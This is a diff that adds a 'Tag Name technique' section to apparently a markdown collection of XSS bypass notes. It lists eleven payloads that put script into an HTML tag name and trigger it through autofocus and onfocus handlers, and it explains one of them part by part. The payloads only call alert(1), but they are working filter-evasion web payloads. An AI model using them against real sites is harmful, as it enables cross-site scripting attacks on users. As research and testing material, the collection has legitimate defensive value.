@@ -287,3 +287,22 @@ Then `/json` is longer.
 4. `HttpOnly` cookie present
 5. Attacker has XSS or CORS execution
 6. Cookie order manipulation works
+#### 2. Tag Name technique
+1 - `<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>`
+**Explain every part in the payload**
+1. `alert(1)` => tag name that will be the main payload function
+2. `onfocus` + `autofocus` => to force the payload to trigger
+3. `tabindex=1` => to allow focus on normally unfocused element
+4. `attributes[0].value` => first attribute which is `onfocus`
+5. `localName` => tag name in small case
+6. `,new onfocus` => allow `alert(1)` to be function not string *optional*
+2 - `<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>`
+3 - `<null alert(1) onfocus="attributes.onfocus.value=localName,new onfocus" autofocus tabindex=1>`
+4 - `<ALERT(1) onfocus="attributes[0].textContent=localName,new onfocus" autofocus tabindex=1>`
+5 - `<ALERT(1) onfocus="attributes[0].nodeValue=localName,new onfocus" autofocus tabindex=1>`
+6 - `<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>`
+7 - `<ALERT(1) onfocus="event=localName;part=onfocus,onfocus=Function,eval(part[1])()" tabindex=1 autofocus>`
+8 - `<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus contenteditable>`
+9 - `<ALERT(1) onfocus="getAttributeNode('onfocus').value=localName,onfocus()" autofocus tabindex=1>`
+10 - `<alert<img title=" src onerror=alert(1)> " onfocus=setHTMLUnsafe(localName+title) tabindex=1 autofocus>`
+11 - `<ALERT(1) onfocus="event=localName;classList=onfocus,onfocus=Function,eval(classList[1])()" tabindex=1 autofocus>`
